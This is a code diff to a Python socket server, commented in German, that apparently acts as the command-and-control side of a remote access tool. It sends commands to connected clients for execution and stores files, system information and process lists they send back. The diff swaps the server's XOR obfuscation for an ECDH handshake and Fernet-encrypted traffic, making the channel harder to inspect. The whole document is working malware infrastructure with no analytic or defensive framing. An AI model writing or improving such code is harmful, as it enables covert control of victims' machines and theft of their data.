@@ -6,7 +6,8 @@ import re
 from rich import print
 import argparse
 import json
-
+from cryptography.hazmat.primitives.asymmetric import ec
+from cryptography.hazmat.primitives import serialization
 
 
 
@@ -76,10 +77,45 @@ def decode_xor_string(s: str, key: bytes = XOR_KEY) -> str:
 
     return re.sub(pattern, repl, s)
 
+
+
+
+
 def Handle_Client(cd, socket):
     s = cd['socket']
     while status_online == "Online":
         try:
+                if not cd['handshake_done']:
+                    hdr = s.recv(4)
+                    if not hdr:
+                        break
+
+                    length = int.from_bytes(hdr, "big")
+
+                    client_pub = b''
+                    while len(client_pub) < length:
+                        client_pub += s.recv(length - len(client_pub))
+
+                    client_key = serialization.load_pem_public_key(client_pub)
+
+                    shared_secret = cd['private_key'].exchange(ec.ECDH(), client_key)
+
+                    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
+                    from cryptography.hazmat.primitives import hashes
+                    import base64
+                    from cryptography.fernet import Fernet
+
+                    cd['shared_key'] = HKDF(
+                        algorithm=hashes.SHA256(),
+                        length=32,
+                        salt=None,
+                        info=b"session"
+                    ).derive(shared_secret)
+
+                    cd['fernet'] = Fernet(base64.urlsafe_b64encode(cd['shared_key']))
+
+                    cd['handshake_done'] = True
+                    continue
                 hdr = s.recv(5)
                 if not hdr or len(hdr) < 5:
                     break
@@ -97,28 +133,29 @@ def Handle_Client(cd, socket):
                 if len(data) != dlen:
                     break
 
-                decoded_data = data.decode(errors='ignore')
+                plaintext = cd['fernet'].decrypt(data).decode()
 
                 if ptype == 0:  # Standard Response
-                    decoded_data = decode_xor_string(decoded_data)
+                    decoded_data = plaintext
                     print(decoded_data)
                     cd['responses'].append(decoded_data)
                 elif ptype == 1:  # Filename Info
-                    cd["incoming_filename"] = decoded_data
+                    cd["incoming_filename"] = plaintext
                 elif ptype == 2:  # File Content
                     fn = cd.get("incoming_filename", "file.bin")
                     sp = os.path.join("received_files", fn)
                     os.makedirs("received_files", exist_ok=True)
                     with open(sp, "wb") as f:
-                        f.write(data)
+                        file_bytes = cd['fernet'].decrypt(data)
+                        f.write(file_bytes)
                     cd['responses'].append(f"Datei empfangen: {fn}")
                 elif ptype == 3:  # SYSTEM INFO
-                    decoded_data = decode_xor_string(decoded_data)
+                    decoded_data = plaintext
                     cd['sys_info'] = decoded_data
                     cd['responses'].append("System-Metadaten aktualisiert.")
                 elif ptype == 4: # PROCESSES
                     # Entschlüsselt den Prozess-String (z.B. "chrome.exe : 1234")
-                    decrypted_proc = decode_xor_string(decoded_data).strip()
+                    decrypted_proc = plaintext
                     if decrypted_proc:
                         # Wir halten die Liste aktuell. Wenn der Client alle 10s sendet,
                         # fügen wir neue hinzu oder könnten die Liste leeren, falls gewünscht.
@@ -144,8 +181,20 @@ def accept_clients(socket):
                     'id': len(connected_clients) + 1,
                     'responses': [],
                     'sys_info': "Warte auf Daten...",
-                    'processes': []  # Liste für ptype 4 initialisieren
+                    'processes': [],  # Liste für ptype 4 initialisieren
+
+                    'private_key': None,
+                    'shared_key': None,
+                    'handshake_done': False
                 }
+            server_private = ec.generate_private_key(ec.SECP256R1())
+            server_public = server_private.public_key()
+            cd["private_key"] = server_private
+            pub_bytes = server_public.public_bytes(
+                encoding=serialization.Encoding.PEM,
+                format=serialization.PublicFormat.SubjectPublicKeyInfo
+            )
+            s.send(len(pub_bytes).to_bytes(4, "big") + pub_bytes)
             connected_clients.append(cd)
             print(f"\n[[{DEFAULT_CONFIG['default_new_connection_color']}]OK[/{DEFAULT_CONFIG['default_new_connection_color']}]]NEW CONNECTION!")
             threading.Thread(target=Handle_Client, args=(cd, s), daemon=True).start()
@@ -175,7 +224,10 @@ def send_command(command):
         for client in connected_clients:
             try:
                 s = client["socket"]
-                s.send(toexec.encode())
+                if not client.get('handshake_done'):
+                    continue
+                encrypted = client['fernet'].encrypt(toexec.encode())
+                s.send(len(encrypted).to_bytes(4, "big") + encrypted)
             except Exception:
                 pass
     else:
@@ -183,7 +235,11 @@ def send_command(command):
             clientid = client["id"]
             if clientid == id:
                 s = client["socket"]
-                s.send(toexec.encode())
+                if not client.get('handshake_done'):
+                    print("Handshake with client is not done yet. Please wait")
+                    continue
+                encrypted = client['fernet'].encrypt(toexec.encode())
+                s.send(len(encrypted).to_bytes(4, "big") + encrypted)
             else:
                 continue
 
